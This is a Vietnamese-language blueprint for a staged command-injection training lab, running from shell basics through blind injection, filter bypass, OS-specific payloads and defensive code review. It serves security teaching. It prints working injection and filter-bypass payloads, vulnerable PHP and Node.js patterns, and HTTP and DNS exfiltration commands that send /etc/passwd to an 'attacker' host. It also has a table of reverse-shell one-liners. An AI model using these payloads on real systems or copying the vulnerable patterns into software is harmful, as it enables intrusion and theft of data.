# Command Injection Lab Blueprint

> **Phiên bản**: 1.0  
> **Knowledge Base Reference**: [_knowledge_base/Web/Command Injection](../_knowledge_base/Web/Command%20Injection/)  
> **Mục tiêu**: Cung cấp khung sườn tổ chức hệ thống lab tái tạo lỗ hổng Command Injection, từ cơ bản đến nâng cao

---

## Tổng quan Kiến trúc Lab

### Triết lý Thiết kế

Hệ thống lab được thiết kế dựa trên nguyên tắc **progressive disclosure** - mỗi module xây dựng trên nền tảng kiến thức của module trước, đồng thời giới thiệu **một khía cạnh mới duy nhất** của lỗ hổng. Điều này đảm bảo:

1. **Học sâu thay vì học rộng**: Mỗi lab tập trung vào một pattern khai thác cụ thể
2. **Mental model rõ ràng**: Người học hiểu *tại sao* payload hoạt động, không chỉ *payload nào* hoạt động
3. **Kỹ năng transfer**: Kiến thức có thể áp dụng sang các biến thể khác của lỗ hổng

### Luồng Tư duy Khai thác Chuẩn

Mọi lab đều tuân theo workflow đã được chuẩn hóa trong knowledge base:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    EXPLOITATION MENTAL MODEL                            │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. RECON         ──► Xác định injection points (params, headers, etc.) │
│        │                                                                │
│        ▼                                                                │
│  2. HYPOTHESIS    ──► Đoán injection context (unquoted/quoted/argument) │
│        │               và execution environment (Linux/Windows/Node.js) │
│        ▼                                                                │
│  3. EXPLOITATION  ──► Chọn separator và payload phù hợp với context     │
│        │               Bypass filters nếu có                            │
│        ▼                                                                │
│  4. VALIDATION    ──► Confirm execution via output/time/OOB channels    │
│                       Xác định privileges và capabilities               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Ma trận Modules

| Module | Trọng tâm | Prerequisite | Số Labs |
|--------|-----------|--------------|---------|
| **M0** | Nền tảng Shell | Không | 2 |
| **M1** | In-band Injection | M0 | 3 |
| **M2** | Injection Context | M1 | 3 |
| **M3** | Blind Injection | M2 | 4 |
| **M4** | Filter Bypass | M1, M2 | 4 |
| **M5** | OS-Specific | M1-M4 | 3 |
| **M6** | Data Exfiltration | M3 | 3 |
| **M7** | Defense Awareness | Tất cả | 2 |

---

## Module 0: Shell Fundamentals

> **Mục tiêu**: Xây dựng nền tảng hiểu biết về shell execution trước khi exploit

### Kiến thức Đầu vào Yêu cầu
- Kiến thức cơ bản về HTTP request/response
- Khả năng sử dụng terminal cơ bản

### Điểm Mấu chốt về Tư duy

Command Injection khai thác việc ứng dụng **ủy quyền** cho OS shell xử lý chuỗi ký tự. Kẻ tấn công lợi dụng **metacharacters** mà shell hiểu như instructions để tách/nối commands. Trước khi học cách exploit, người học cần hiểu shell **interpret** input như thế nào.

### Lab 0.1: Shell Metacharacter Behavior

**Khái niệm trọng tâm**: Command separators và operator precedence  
**Tham chiếu KB**: [00-overview.md#shell-metacharacters-quick-reference](../_knowledge_base/Web/Command%20Injection/00-overview.md)

**Thiết kế Lab**:
- Môi trường: Interactive shell terminal (không có web app)
- Người học thực hành trực tiếp với các operators:
  - Sequential: `;`, `|`, `||`, `&&`, `&`
  - Substitution: `` `cmd` ``, `$(cmd)`
- Quan sát output để hiểu behavior của từng operator

**Learning Outcome**:
- Phân biệt được khi nào dùng `;` vs `||` vs `&&`
- Hiểu command substitution hoạt động như thế nào
- Nhận ra Linux-only vs cross-platform operators

### Lab 0.2: Quoting and Escaping

**Khái niệm trọng tâm**: Single quotes, double quotes, và variable expansion  
**Tham chiếu KB**: [02-exploitation.md#breaking-out-of-quoted-contexts](../_knowledge_base/Web/Command%20Injection/02-exploitation.md)

**Thiết kế Lab**:
- Thực hành sự khác biệt giữa `'$var'` và `"$var"`
- Hiểu tại sao `$(cmd)` hoạt động trong double quotes nhưng không trong single quotes
- Thực hành escape sequences

**Learning Outcome**:
- Có thể dự đoán output của shell khi có quotes
- Hiểu được lý do cần "break out" khỏi quoted context

---

## Module 1: In-band Command Injection

> **Mục tiêu**: Master các kỹ thuật injection cơ bản khi output hiển thị trực tiếp trong response

### Kiến thức Đầu vào Yêu cầu
- Module 0 hoàn thành
- Hiểu cơ bản về web application architecture

### Điểm Mấu chốt về Tư duy

In-band injection là trường hợp "lý tưởng" cho attacker vì feedback loop ngắn - inject và thấy ngay kết quả. Tuy nhiên, điều này cũng có nghĩa là **xác định injection point** trở thành kỹ năng quan trọng nhất. Không phải mọi parameter đều vulnerable, và không phải mọi separator đều hoạt động.

**Classification Reference**:
| Type | Description | Detection Method |
|------|-------------|------------------|
| **In-band** | Output hiển thị trong response | Trực tiếp quan sát kết quả |

### Lab 1.1: Unquoted Parameter Injection

**Khái niệm trọng tâm**: Direct injection vào unquoted context  
**Tham chiếu KB**: [01-detection.md#step-1-xác-định-injection-context](../_knowledge_base/Web/Command%20Injection/01-detection.md)

**Vulnerable Code Pattern**:
```php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
```

**Thiết kế Lab**:
- Web form với chức năng ping IP address
- Backend: PHP với `system()` call
- Không có filtering hoặc quoting

**Exploitation Focus**:
1. Xác định parameter name thông qua form analysis
2. Test separator sequence: `;`, `|`, `||`, `&&`
3. Confirm với `; id` hoặc `; whoami`

**Learning Outcome**:
- Nhận diện unquoted context
- Hiểu tại sao `;` hoạt động (tham chiếu M0)
- Thực hành systematic separator testing

### Lab 1.2: Pipe-based Output Redirection

**Khái niệm trọng tâm**: Sử dụng pipe operator để controlled output  
**Tham chiếu KB**: [02-exploitation.md#command-chaining-operators](../_knowledge_base/Web/Command%20Injection/02-exploitation.md)

**Scenario khác biệt với Lab 1.1**:
- Original command có output riêng
- Cần redirect attacker's command output thay thế

**Vulnerable Code Pattern**:
```php
$file = $_GET['file'];
system("cat /var/www/docs/" . $file);
```

**Exploitation Focus**:
1. Input: `| id` - pipe output của cat (fail) vào stdin của id
2. Input: `nonexistent | id` - force cat fail, id runs
3. So sánh với `; id` để hiểu sự khác biệt

**Learning Outcome**:
- Phân biệt pipe (`|`) vs semicolon (`;`)
- Hiểu khi nào dùng pipe hiệu quả hơn

### Lab 1.3: Command Substitution Leakage

**Khái niệm trọng tâm**: Lồng command vào argument của original command  
**Tham chiếu KB**: [02-exploitation.md#command-substitution](../_knowledge_base/Web/Command%20Injection/02-exploitation.md)

**Scenario khác biệt**:
- Không thể chèn separator do validation
- Original command vẫn run với injected output

**Vulnerable Code Pattern**:
```php
$host = $_GET['host'];
system("nslookup " . $host);
```

**Exploitation Focus**:
1. Input: `$(whoami).attacker.com` - substitution thành `root.attacker.com`
2. Quan sát nslookup output để infer command result
3. So sánh `` `whoami` `` vs `$(whoami)` syntax

**Learning Outcome**:
- Hiểu command substitution là injection vector
- Nhận ra output có thể "leak" qua original command behavior

---

## Module 2: Injection Context Mastery

> **Mục tiêu**: Khai thác trong các quoted contexts khác nhau

### Kiến thức Đầu vào Yêu cầu
- Module 1 hoàn thành
- Hiểu shell quoting từ Module 0

### Điểm Mấu chốt về Tư duy

Nhiều developers tin rằng quoting user input là đủ để ngăn injection. Thực tế, quotes chỉ thay đổi **cách tiếp cận**, không loại bỏ vulnerability. Người học cần phát triển khả năng **nhận diện context** từ error messages và response behavior.

**Context Classification**:
| Context | Original Command | Detection Approach |
|---------|------------------|---------------------|
| Unquoted | `ping $ip` | Thử trực tiếp `;id` |
| Single-quoted | `ping '$ip'` | Escape với `';id #` |
| Double-quoted | `ping "$ip"` | Escape với `";id #` |

### Lab 2.1: Single Quote Escape

**Khái niệm trọng tâm**: Breaking out của single-quoted context  
**Tham chiếu KB**: [02-exploitation.md#single-quote-context](../_knowledge_base/Web/Command%20Injection/02-exploitation.md)

**Vulnerable Code Pattern**:
```php
$filename = $_GET['file'];
system("ls -la '/var/uploads/" . $filename . "'");
```

**Thiết kế Lab**:
- Error-based detection: Inject `'` và quan sát shell error
- Exploit: `'; whoami #` để close quote, execute, comment

**Key Insight để Truyền đạt**:
- Single quotes **không** expand `$()` → `$(whoami)` sẽ fail
- Phải escape out trước khi inject

**Learning Outcome**:
- Nhận diện single-quoted context từ error messages
- Master pattern: `'; command #`

### Lab 2.2: Double Quote Escape with Variable Expansion

**Khái niệm trọng tâm**: Khai thác variable expansion trong double quotes  
**Tham chiếu KB**: [02-exploitation.md#double-quote-context](../_knowledge_base/Web/Command%20Injection/02-exploitation.md)

**Vulnerable Code Pattern**:
```php
$query = $_POST['q'];
system("grep \"$query\" /var/log/app.log");
```

**Scenario khác biệt với Lab 2.1**:
- Double quotes cho phép `$()` expansion
- Có thể inject **mà không cần** escape out

**Exploitation Focus**:
1. `"; whoami #` - traditional escape
2. `$(whoami)` - inline expansion (output becomes grep pattern)
3. `` `whoami` `` - backtick variant

**Learning Outcome**:
- Phân biệt single vs double quote behavior
- Nhận ra double quotes có thêm attack surface

### Lab 2.3: Nested Context Detection

**Khái niệm trọng tâm**: Context detection qua systematic probing  
**Tham chiếu KB**: [01-detection.md#detection-methodology](../_knowledge_base/Web/Command%20Injection/01-detection.md)

**Thiết kế Lab**:
- Black-box scenario: Không biết source code
- Random rotation giữa unquoted, single-quoted, double-quoted contexts
- Người học phải detect context trước khi exploit

**Methodology để Dạy**:
```
Step 1: Test ';id # → nếu works → single-quoted
Step 2: Test ";id # → nếu works → double-quoted  
Step 3: Test ;id    → nếu works → unquoted
Step 4: Test $(id)  → nếu works trong response → double-quoted hoặc unquoted
```

**Learning Outcome**:
- Systematic approach thay vì trial-and-error
- Confidence trong context identification

---

## Module 3: Blind Command Injection

> **Mục tiêu**: Khai thác khi không có output trực tiếp trong response

### Kiến thức Đầu vào Yêu cầu
- Module 2 hoàn thành
- Hiểu HTTP request/response timing

### Điểm Mấu chốt về Tư duy

Blind injection yêu cầu **inference** - suy luận từ side effects thay vì direct observation. Đây là bước nhảy cognitive quan trọng: từ "thấy output" sang "suy luận từ behavior". Ba kênh inference chính:

1. **Time-based**: Response delay
2. **File-based**: Write to accessible location
3. **Out-of-Band**: External channel callback

**Tham chiếu KB**: [03-blind-injection.md#definition](../_knowledge_base/Web/Command%20Injection/03-blind-injection.md)

### Lab 3.1: Time-based Detection

**Khái niệm trọng tâm**: Confirm vulnerability qua response timing  
**Tham chiếu KB**: [03-blind-injection.md#time-based-detection](../_knowledge_base/Web/Command%20Injection/03-blind-injection.md)

**Vulnerable Code Pattern**:
```php
$host = $_POST['host'];
exec("ping -c 4 " . $host);  // No output returned
echo "Ping completed";
```

**Thiết kế Lab**:
- Response body chỉ hiện "Ping completed"
- Không có command output

**Exploitation Focus**:
1. Baseline: Đo response time bình thường (~4 giây cho ping)
2. Test: `; sleep 5` → response time tăng ~5 giây
3. Confirm: `; sleep 10` → response time tăng ~10 giây
4. Logic: `if delay ∝ sleep_value → CONFIRMED`

**Windows Variant** (cùng lab, switch OS):
```
& ping -n 10 127.0.0.1
```

**Learning Outcome**:
- Master time-based confirmation technique
- Hiểu cross-platform differences (sleep vs ping -n)

### Lab 3.2: Output Redirection to Web Root

**Khái niệm trọng tâm**: Write output to accessible file  
**Tham chiếu KB**: [03-blind-injection.md#output-redirection-to-web-root](../_knowledge_base/Web/Command%20Injection/03-blind-injection.md)

**Scenario khác biệt với Lab 3.1**:
- Time-based đã confirm vulnerable
- Bây giờ cần exfiltrate data

**Exploitation Focus**:
1. Xác định web root path (trial: `/var/www/html/`, `/usr/share/nginx/html/`)
2. Inject: `; whoami > /var/www/html/out.txt`
3. Access: `curl http://target/out.txt`

**Common Web Root Paths to Teach**:
| Server | Common Paths |
|--------|--------------|
| Apache | `/var/www/html/`, `/var/www/` |
| Nginx | `/usr/share/nginx/html/` |
| IIS | `C:\inetpub\wwwroot\` |

**Learning Outcome**:
- Master file redirection technique
- Understand web root enumeration

### Lab 3.3: DNS Out-of-Band Exfiltration

**Khái niệm trọng tâm**: Data exfiltration qua DNS channel  
**Tham chiếu KB**: [03-blind-injection.md#dns-exfiltration](../_knowledge_base/Web/Command%20Injection/03-blind-injection.md)

**Scenario khác biệt**:
- Không có writable web root
- Outbound HTTP blocked
- Nhưng DNS queries được allow

**Infrastructure Setup**:
- Attacker controls DNS server (hoặc dùng dnsbin.zhack.ca, interactsh)

**Exploitation Focus**:
1. Basic: `; nslookup attacker.com` → confirm outbound DNS
2. With data: `; nslookup $(whoami).attacker.com`
3. File content: `; for i in $(ls /); do host "$i.attacker.com"; done`

**DNS Label Constraints to Teach**:
- Max 63 chars per label
- Only alphanumeric and `-`
- Need encoding for special chars

**Learning Outcome**:
- Master DNS exfiltration technique
- Understand OOB channel concept

### Lab 3.4: Time-based Character Extraction

**Khái niệm trọng tâm**: Bit-by-bit data exfiltration qua timing  
**Tham chiếu KB**: [03-blind-injection.md#time-based-data-exfiltration](../_knowledge_base/Web/Command%20Injection/03-blind-injection.md)

**Scenario khác biệt**:
- Không có file write
- Không có outbound network (full airgap)
- **Only option**: timing oracle

**Exploitation Focus**:
```bash
# Check if first char of username = 'w'
; if [ $(whoami|cut -c 1) == w ]; then sleep 3; fi
```

**Automation Concept**:
```python
for position in range(1, 20):
    for char in charset:
        payload = f"; if [ $(whoami|cut -c {position}) == {char} ]; then sleep 3; fi"
        if request_time >= 3:
            result += char
            break
```

**Learning Outcome**:
- Understand timing oracle as last-resort technique
- Appreciate automation necessity for practical exploitation

---

## Module 4: Filter Bypass Techniques

> **Mục tiêu**: Vượt qua các cơ chế filtering phổ biến

### Kiến thức Đầu vào Yêu cầu
- Module 1 và 2 hoàn thành
- Hiểu shell expansion mechanics (M0)

### Điểm Mấu chốt về Tư duy

Filters tạo ra "**arms race**" giữa defender và attacker. Điểm yếu fundamental của blocklist approach là không thể enumerate tất cả bypass possibilities. Người học cần hiểu **tại sao** mỗi bypass hoạt động để có thể improvise trong real-world scenarios.

**Filter Analysis Methodology** (Tham chiếu KB: [04-filter-bypass.md#filter-analysis-methodology](../_knowledge_base/Web/Command%20Injection/04-filter-bypass.md)):
| Question | Implication |
|----------|-------------|
| Filter client-side hay server-side? | Client-side dễ bypass hoàn toàn |
| Filter special characters hay commands? | Quyết định bypass technique |
| Allowlist hay blocklist? | Blocklist thường có gaps |

### Lab 4.1: Space Character Bypass

**Khái niệm trọng tâm**: Bypass khi space bị filter  
**Tham chiếu KB**: [04-filter-bypass.md#space-bypass-techniques](../_knowledge_base/Web/Command%20Injection/04-filter-bypass.md)

**Filter Implementation**:
```php
$input = str_replace(' ', '', $_GET['cmd']);  // Remove all spaces
```

**Bypass Techniques to Practice**:

| Technique | Payload | Why It Works |
|-----------|---------|--------------|
| `$IFS` | `cat${IFS}/etc/passwd` | IFS = Internal Field Separator (space/tab/newline) |
| Tab | `cat%09/etc/passwd` | `%09` = tab character |
| Brace expansion | `{cat,/etc/passwd}` | Expands to `cat /etc/passwd` |
| Input redirection | `cat</etc/passwd` | `<` không cần space |

**Learning Outcome**:
- Multiple alternatives khi space blocked
- Hiểu shell expansion mechanisms

### Lab 4.2: Command Keyword Bypass

**Khái niệm trọng tâm**: Bypass khi specific commands bị blacklist  
**Tham chiếu KB**: [04-filter-bypass.md#command-obfuscation](../_knowledge_base/Web/Command%20Injection/04-filter-bypass.md)

**Filter Implementation**:
```php
$blacklist = ['cat', 'whoami', 'id', 'ls'];
foreach ($blacklist as $cmd) {
    if (stripos($input, $cmd) !== false) die("Blocked");
}
```

**Bypass Techniques**:

| Technique | Original | Bypassed |
|-----------|----------|----------|
| Quote insertion | `whoami` | `w'h'o'am'i` |
| Empty string | `cat` | `c''at` hoặc `c""at` |
| Backslash | `whoami` | `w\ho\am\i` |
| `$@` insertion | `whoami` | `who$@ami` |
| Empty substitution | `cat` | `ca$(echo)t` |

**Key Insight**:
- Quotes/backslashes trong middle of command word được shell interpret rồi remove
- Result: original command name đúng

**Learning Outcome**:
- Multiple obfuscation techniques
- Understanding của shell parsing rules

### Lab 4.3: Encoding-based Bypass

**Khái niệm trọng tâm**: Sử dụng encoding để bypass character filters  
**Tham chiếu KB**: [04-filter-bypass.md#encoding-techniques](../_knowledge_base/Web/Command%20Injection/04-filter-bypass.md)

**Filter Implementation**:
```php
// Block common separators
$blocked = [';', '|', '&', '`', '$'];
```

**Bypass Techniques**:

1. **URL Encoding** (if double-decoded):
   ```
   ; → %3b → %253b (double)
   | → %7c → %257c
   ```

2. **Hex Encoding**:
   ```bash
   cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
   # \x2f = /
   ```

3. **Base64 Encoding**:
   ```bash
   echo d2hvYW1p | base64 -d | bash
   # d2hvYW1p = whoami
   ```

**Learning Outcome**:
- Encoding as bypass vector
- Shell's built-in decode capabilities

### Lab 4.4: Wildcard and Environment Variable Bypass

**Khái niệm trọng tâm**: Bypass sử dụng wildcards và env var extraction  
**Tham chiếu KB**: [04-filter-bypass.md#wildcard-bypass](../_knowledge_base/Web/Command%20Injection/04-filter-bypass.md)

**Scenario**:
- Cả `/` và specific paths bị blocked

**Bypass với Wildcards**:
```bash
/???/??t /???/p??s??
# = /bin/cat /etc/passwd
```

**Bypass với Environment Variables**:
```bash
# Extract / from PATH
${PATH:0:1}etc${PATH:0:1}passwd
# = /etc/passwd
```

**Learning Outcome**:
- Creative use of shell features
- Environment as character source

---

## Module 5: OS-Specific Techniques

> **Mục tiêu**: Adapt khai thác cho Linux vs Windows environments

### Kiến thức Đầu vào Yêu cầu
- Modules 1-4 hoàn thành

### Điểm Mấu chốt về Tư duy

Mỗi OS có shell khác nhau với syntax và capabilities riêng. Real-world exploitation yêu cầu **rapid OS identification** và **payload adaptation**. Module này xây dựng "**dual fluency**" - khả năng exploit cả hai environments.

**Critical Difference Reference** (Tham chiếu KB: [05-os-specific.md#command-separators-comparison](../_knowledge_base/Web/Command%20Injection/05-os-specific.md)):
| Operator | Linux | Windows CMD |
|----------|-------|-------------|
| `;` | ✓ | ✗ |
| `\|` | ✓ | ✓ |
| `&&` | ✓ | ✓ |
| `&` | ✓ | ✓ |
| `` `cmd` `` | ✓ | ✗ |

### Lab 5.1: OS Detection via Differential Testing

**Khái niệm trọng tâm**: Xác định OS qua response behavior  
**Tham chiếu KB**: [05-os-specific.md#command-separators-comparison](../_knowledge_base/Web/Command%20Injection/05-os-specific.md)

**Thiết kế Lab**:
- Black-box: Không biết target OS
- Randomized: Linux hoặc Windows server

**Detection Methodology**:
```
Test 1: ; uname -a     → Linux output = Linux
Test 2: & ver          → Windows version = Windows
Test 3: ; sleep 3      → Delay = Linux
Test 4: & ping -n 3 127.0.0.1 → Delay = Windows
```

**Learning Outcome**:
- Systematic OS detection
- Understanding of cross-platform payload selection

### Lab 5.2: Windows CMD Exploitation

**Khái niệm trọng tâm**: Windows-specific separators và commands  
**Tham chiếu KB**: [05-os-specific.md#windows-cmd](../_knowledge_base/Web/Command%20Injection/05-os-specific.md)

**Vulnerable Application**: ASP.NET on IIS

**Key Differences to Practice**:
- `&` instead of `;` for sequential execution
- Case insensitivity: `WhOaMi` = `whoami`
- Environment variable syntax: `%USERNAME%` instead of `$USER`

**Windows-Specific Payloads**:
```cmd
& whoami
& type C:\Windows\win.ini
& dir C:\
& net user
```

**Space Bypass (Windows)**:
```cmd
%PROGRAMFILES:~10,-5%
```

**Learning Outcome**:
- Windows CMD fluency
- Platform-specific bypass techniques

### Lab 5.3: Node.js exec() vs execFile()

**Khái niệm trọng tâm**: Application-level injection trong Node.js  
**Tham chiếu KB**: [05-os-specific.md#nodejs-specific-vulnerabilities](../_knowledge_base/Web/Command%20Injection/05-os-specific.md)

**Vulnerable Pattern**:
```javascript
const { exec } = require('child_process');
exec(`ping ${userInput}`);  // VULNERABLE - spawns shell
```

**Safe Pattern** (để contrast):
```javascript
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', userInput]);  // SAFE - no shell
```

**Exploitation Focus**:
- Khai thác `exec()` với standard Linux payloads
- Hiểu tại sao `execFile()` không vulnerable
- Identify `shell: true` option vulnerability

**Learning Outcome**:
- Language/framework-specific knowledge
- API-level security understanding

---

## Module 6: Advanced Data Exfiltration

> **Mục tiêu**: Master các kỹ thuật trích xuất dữ liệu trong constrained environments

### Kiến thức Đầu vào Yêu cầu
- Module 3 (Blind Injection) hoàn thành

### Điểm Mấu chốt về Tư duy

Exfiltration là "**last mile**" của exploitation. Trong real-world, defenders thường focus on preventing initial access nhưng để lỏng outbound controls. Người học cần master **decision tree** để chọn exfiltration channel phù hợp.

**Exfiltration Decision Tree** (Tham chiếu KB: [06-exfiltration.md#exfiltration-workflow](../_knowledge_base/Web/Command%20Injection/06-exfiltration.md)):
```
Can write to web root? → Use file redirection
Outbound DNS allowed? → Use DNS exfiltration
Outbound HTTP allowed? → Use HTTP callback
All blocked? → Use time-based extraction
```

### Lab 6.1: HTTP-based Exfiltration

**Khái niệm trọng tâm**: Data exfiltration qua HTTP callbacks  
**Tham chiếu KB**: [06-exfiltration.md#http-based-exfiltration](../_knowledge_base/Web/Command%20Injection/06-exfiltration.md)

**Scenario**: Outbound HTTP allowed, DNS blocked

**Techniques**:

1. **GET request with data in URL**:
   ```bash
   ; curl "http://attacker/?data=$(whoami)"
   ; wget "http://attacker/?file=$(cat /etc/passwd | base64 | tr -d '\n')"
   ```

2. **POST request với file content**:
   ```bash
   ; curl -X POST -d @/etc/passwd http://attacker/
   ; curl -X POST -d "$(cat /etc/passwd | base64)" http://attacker/
   ```

**Infrastructure**:
- Attacker-controlled HTTP server để log requests
- Hoặc webhook.site, requestbin.com

**Learning Outcome**:
- HTTP exfiltration techniques
- Base64 encoding for binary-safe transfer

### Lab 6.2: Chunked DNS Exfiltration

**Khái niệm trọng tâm**: Bypass DNS label limits với chunking  
**Tham chiếu KB**: [06-exfiltration.md#dns-based-exfiltration](../_knowledge_base/Web/Command%20Injection/06-exfiltration.md)

**Challenge**: DNS label max 63 chars, file content > 63 chars

**Technique**:
```bash
# Chunk và gửi từng phần
; cat /etc/passwd | base64 | fold -w60 | while read line; do nslookup "$line.attacker.com"; done
```

**Handling Special Characters**:
- Base64 có `+` và `/` - không valid trong DNS
- Solution: hex encode hoặc custom alphabet

**Learning Outcome**:
- Chunked data transfer over DNS
- Protocol constraints handling

### Lab 6.3: Reverse Shell Establishment

**Khái niệm trọng tâm**: Upgrade từ command execution sang interactive shell  
**Tham chiếu KB**: [06-exfiltration.md#reverse-shell-techniques](../_knowledge_base/Web/Command%20Injection/06-exfiltration.md)

**Scenario**: Full command execution confirmed, need interactive access

**Payloads by Runtime**:

| Runtime | Payload |
|---------|---------|
| Bash | `bash -i >& /dev/tcp/attacker/4444 0>&1` |
| Netcat | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc attacker 4444 >/tmp/f` |
| Python | `python -c 'import socket,subprocess,os;...'` |
| PowerShell | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient..."` |

**Background Execution** (để tránh timeout):
```bash
; nohup bash -i >& /dev/tcp/attacker/4444 0>&1 &
```

**Learning Outcome**:
- Multiple reverse shell techniques
- Runtime detection và payload selection

---

## Module 7: Defense Awareness

> **Mục tiêu**: Hiểu defensive measures để improve exploitation skills và future-proof knowledge

### Kiến thức Đầu vào Yêu cầu
- Tất cả modules trước hoàn thành

### Điểm Mấu chốt về Tư duy

Understanding defense không chỉ để "exploit better" mà để develop **adversarial thinking**. Khi biết developers defend như thế nào, attacker có thể predict và bypass. Module này cũng giúp người học transition sang defensive roles nếu cần.

**Defense Priority Reference** (Tham chiếu KB: [08-defense-mitigation.md#defense-summary](../_knowledge_base/Web/Command%20Injection/08-defense-mitigation.md)):
```
1. AVOID     → Don't use OS commands
2. PARAMETERIZE → Use argument arrays
3. VALIDATE  → Strict allowlist
4. ESCAPE    → escapeshellarg()
5. HARDEN    → Least privilege
```

### Lab 7.1: Breaking Inadequate Defenses

**Khái niệm trọng tâm**: Bypass common weak defenses  
**Tham chiếu KB**: [08-defense-mitigation.md#blocklist-approach](../_knowledge_base/Web/Command%20Injection/08-defense-mitigation.md)

**Thiết kế Lab**: Series of challenges với increasing defense quality

**Challenge A**: Client-side validation only
```javascript
// Bypass: Intercept request, modify parameter
```

**Challenge B**: Blocklist của common chars
```php
$blocked = [';', '|', '&'];
// Bypass: %0a (newline), backticks, $()
```

**Challenge C**: Blocklist của commands
```php
$blocked = ['cat', 'ls', 'whoami'];
// Bypass: c''at, /???/c?t, base64 encoded
```

**Learning Outcome**:
- Recognize và bypass weak defenses
- Understand why blocklist fails

### Lab 7.2: Secure Implementation Analysis

**Khái niệm trọng tâm**: Recognize secure patterns  
**Tham chiếu KB**: [08-defense-mitigation.md#nodejs](../_knowledge_base/Web/Command%20Injection/08-defense-mitigation.md)

**Thiết kế Lab**: Code review exercises

**Secure Pattern Examples**:

1. **Parameterized execution**:
   ```javascript
   execFile('ping', ['-c', '4', userInput]);  // No shell
   ```

2. **Allowlist validation**:
   ```php
   if (!preg_match('/^[0-9]{1,3}(\.[0-9]{1,3}){3}$/', $ip)) die("Invalid");
   ```

3. **Avoiding shell entirely**:
   ```python
   import socket
   # Use socket library instead of system("ping")
   ```

**Learning Outcome**:
- Recognize secure vs insecure code
- Understand defense-in-depth principles

---

## Appendices

### Appendix A: Lab Environment Setup

**Recommended Infrastructure**:
- Docker containers cho isolated vulnerable apps
- Each module = separate container
- Network isolation giữa attacker và target

**Base Technologies**:
| Module | Backend Stack |
|--------|---------------|
| M1-M4 | PHP + Apache |
| M5.2 | ASP.NET + IIS |
| M5.3 | Node.js + Express |

### Appendix B: Payload Quick Reference

**Tham chiếu đầy đủ**: [07-payloads-cheatsheet.md](../_knowledge_base/Web/Command%20Injection/07-payloads-cheatsheet.md)

**Essential Detection Payloads**:
```bash
# Cross-platform
| whoami
|| whoami
& whoami
&& whoami

# Linux only
; whoami
`whoami`
$(whoami)
%0a whoami
```

**Context-Aware Escapes**:
```bash
# Single quote: '; whoami #
# Double quote: "; whoami #
# Double quote (no break): $(whoami)
```

### Appendix C: Knowledge Base Cross-Reference

| Lab | Primary KB Reference |
|-----|---------------------|
| 0.1, 0.2 | 00-overview.md, 02-exploitation.md |
| 1.1, 1.2, 1.3 | 01-detection.md, 02-exploitation.md |
| 2.1, 2.2, 2.3 | 02-exploitation.md |
| 3.1, 3.2, 3.3, 3.4 | 03-blind-injection.md |
| 4.1, 4.2, 4.3, 4.4 | 04-filter-bypass.md |
| 5.1, 5.2, 5.3 | 05-os-specific.md |
| 6.1, 6.2, 6.3 | 06-exfiltration.md |
| 7.1, 7.2 | 08-defense-mitigation.md |

---

## Changelog

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2026-02-02 | Initial blueprint |

